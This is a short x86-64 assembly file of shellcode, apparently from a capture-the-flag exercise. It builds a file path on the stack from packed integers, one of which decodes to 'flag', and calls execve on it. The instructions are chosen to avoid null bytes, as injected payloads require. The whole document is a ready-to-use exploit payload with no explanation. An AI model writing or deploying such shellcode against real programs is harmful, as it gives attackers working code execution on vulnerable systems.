BITS 64
global _start

_start:
	; mov rdi, 0
	xor rdi, rdi
	push rdi
	mov rdi, 1734437990
	push rdi
	mov rdi, 8387223334460940847
	push rdi
	xor rsi, rsi
	xor rdx, rdx
	mov rdi, rsp
	xor rax, rax
	mov al, 0x3b
	syscall